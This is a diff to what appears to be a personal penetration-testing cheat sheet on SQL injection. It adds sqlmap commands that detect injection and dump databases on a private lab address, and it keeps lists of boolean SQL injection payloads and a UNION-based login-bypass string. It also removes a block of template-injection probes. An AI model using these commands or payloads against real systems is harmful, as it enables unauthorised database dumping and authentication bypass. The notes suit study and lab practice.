@@ -1,6 +1,10 @@
 🗲SqlMap
   #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user  -> Testing on parameter names "user", we'll get confirmation
   #sqlmap -u http://192.168.50.19/blindsqli.php?user=1 -p user --dump  -> Dumping database
+  #sqlmap.py -r /home/request.txt --dbs -> Login page username sqli detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-36e091e8a070)
+  #sqlmap.py -r /home/request.txt --dbs --level 5 -> parameter sql detect.(https://infosecwriteups.com/sql-injection-for-beginners-using-sqlmap-part-2-53e9775b67f5)
+
+
 
 🗲Ghauri (https://github.com/r0oth3x49/ghauri)
 
@@ -13,8 +17,8 @@
 
 
 
-🗲test🗲
-!!!Do brute force with this payload and check the length of the page.
+#Firs detect vulnerability.
+id=1  id=2-1 same ? or 500 internal server error for the following payload ?
 " or "1"+"2
 " or "1"="-2"--
 " or "1+2"/*
@@ -36,20 +40,6 @@
 ' or "a" or '
 ' or 1 or '
 ' or true() or '
-{7*7}
-*{7*7}
-{{7*7}}
-[[7*7]]
-${7*7}
-@(7*7)
-<?=7*7?>
-<%= 7*7 %>
-${= 7*7}
-{{= 7*7}}
-${{7*7}}
-#{7*7}
-[=7*7]
-
   
 🗲Login Page🗲
 USERNAME : admin' UNION SELECT '12345' AS password#    PASSWORD : 12345
